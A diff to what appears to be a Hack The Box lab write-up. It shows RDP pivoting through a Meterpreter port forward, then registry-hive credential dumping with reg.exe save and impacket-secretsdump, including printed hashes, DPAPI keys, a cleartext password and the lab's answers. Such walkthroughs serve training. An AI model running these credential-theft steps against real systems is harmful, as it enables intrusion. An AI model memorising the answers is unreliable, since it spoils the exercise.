@@ -211,10 +211,65 @@ With the Meterpreter session established, I forwarded port 3389 (RDP) from MS01 
 (Meterpreter 1)(C:\Users\Administrator\Desktop) > portfwd add -l 3300 -p 3389 -r 172.16.6.50
 [*] Forward TCP relay created: (local) :3300 -> (remote) 172.16.6.50:3389
 ```
-This allowed me to connect to MS01 via Remote Desktop by tunneling through WEB-WIN01. On my attack machine, I used xfreerdp to establish an RDP session with MS01 using the forwarded port:
+This allowed me to connect to MS01 via Remote Desktop by tunneling through WEB-WIN01. On my attack machine, I used xfreerdp to establish an RDP session with MS01 using the forwarded port, this command also Maps your local directory (/home/htb-ac-1310789/Desktop) to the RDP session under the share name Desktop which makes it easier to copy file to the attack host. 
+
+In the remote Windows session, the drive will appear as \\tsclient\Desktop.:
 ```c
-xfreerdp /v:localhost:3300 /u:svc_sql /p:lucky7
+xfreerdp /v:localhost:3300 /u:svc_sql /p:lucky7 /d:INLANEFREIGHT.LOCAL /drive:Desktop,/home/htb-ac-1310789/Desktop
 ```
 I navigated to C:\Users\Administrator\Desktop and obtained the flag.
 
 5- **Find cleartext credentials for another domain user. Submit the username as your answer.**
+
+On the RDP host I copied the registry hives:
+
+```c
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+
+The operation completed successfully.
+```
+Once I copied the registry hives to my attack host, I proceeded to run secretsdump.py:
+```c
+ impacket-secretsdump -sam sam.save -system system.save -security security.save local
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x9521a9e7c65245ab8cdd792e7f6d20df
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
+[*] Dumping cached domain logon information (domain/username:hash)
+INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801: (2022-04-29 17:46:50+00:00)
+INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb: (2025-03-27 14:21:21+00:00)
+INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245: (2022-04-20 10:25:07+00:00)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:e03b0fd1d8d6fb463618bff7654ea921b731836763a7eb1ca1ff9f4b9df3e09df435358229105d5309694a07ff890b097ff41ac8bb2daf89f259cc3681f12da0469f6fa17aed99168f061cfaa803e3f5585a626e3ba15675116be55fcbab59c52575420a7fb0aae2a3d4728af0af40c2a0baee4656f50d61d45e48550f4963910ebb1d91d22e73fb21edf9fb5a66834971679687c3e9844cc2a507f5e050bb235321f3b9e093d3fe4806788bed2d33546070a9040d081e2e56671d9a88848c49dd95452ba4ff6c0ff5828c05c1bce5aeaaca79185fab39ddba26b8477423f4369f20b850bf91967ce14a0bfaa898cdea
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e4b390d025f63a47132b975d73bf33ab
+[*] DefaultPassword 
+(Unknown User):Sup3rS3cur3D0m@inU2eR
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
+dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19
+[*] NL$KM 
+ 0000   A2 52 9D 31 0B B7 1C 75  45 D6 4B 76 41 2D D3 21   .R.1...uE.KvA-.!
+ 0010   C6 5C DD 04 24 D3 07 FF  CA 5C F4 E5 A0 38 94 14   .\..$....\...8..
+ 0020   91 64 FA C7 91 D2 0E 02  7A D6 52 53 B4 F4 A9 6F   .d......z.RS...o
+ 0030   58 CA 76 00 DD 39 01 7D  C5 F7 8F 4B AB 1E DC 63   X.v..9.}...K...c
+NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
+[*] Cleaning up... 
+```
+> Answer:tpetty
+
+6- **Submit this user's cleartext password.**
+
+> Answer:Sup3rS3cur3D0m@inU2eR
